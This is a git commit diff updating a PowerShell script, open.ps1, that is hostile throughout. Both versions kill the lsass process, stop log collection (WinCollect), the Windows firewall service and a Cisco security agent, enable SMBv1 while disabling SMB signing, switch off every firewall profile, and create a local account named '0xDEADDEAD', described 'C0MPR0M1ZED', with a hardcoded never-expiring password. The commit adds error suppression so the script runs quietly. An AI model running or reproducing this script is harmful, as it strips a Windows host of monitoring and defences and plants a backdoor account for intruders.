a7cba4964b2b9e6f505d17f040aab2654480d887
stefanos007 <omgandthreelols@gmail.com>
2024-04-03 18:06:47 +0300

    Update open.ps1

--- open.ps1
+++ open.ps1
@@ -1,12 +1,12 @@
-Stop-Process -Name "lsass.exe"
-Stop-Process -Name "WinCollectSvc.exe" -Force
-Stop-Process -Name "WinCollect.exe" -Force
-Stop-Service -Name "mpssvc" -Force
-Stop-Service -Name "CiscoSCMS" -Force
-Set-SmbServerConfiguration -EnableSMB1Protocol $true
-Set-SmbServerConfiguration -EnableSMB2Protocol $false
-Set-SmbServerConfiguration -EnableSecuritySignature $false -RequireSecuritySignature $false
-Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled $false
+Stop-Process -Name "lsass" -ErrorAction Ignore
+Stop-Process -Name "WinCollectSvc" -Force -ErrorAction Ignore
+Stop-Process -Name "WinCollect" -Force -ErrorAction Ignore
+Stop-Service -Name "mpssvc" -Force -ErrorAction Ignore
+Stop-Service -Name "CiscoSCMS" -Force -ErrorAction Ignore
+Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force -ErrorAction Ignore
+Set-SmbServerConfiguration -EnableSMB2Protocol $false -Force -ErrorAction Ignore
+Set-SmbServerConfiguration -EnableSecuritySignature $false -RequireSecuritySignature $false -Force
+Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled $false -ErrorAction Ignore
 
 $pwd=ConvertTo-SecureString -String "ZznRImk1TefX3AWinSCx" -AsPlainText -Force
 New-LocalUser -Name "0xDEADDEAD" -FullName "0xDEADDEAD" -AccountNeverExpires $true -Description "C0MPR0M1ZED" -Disabled $false -Password $pwd -PasswordNeverExpires $true -UserMayNotChangePassword $true -Confirm $false
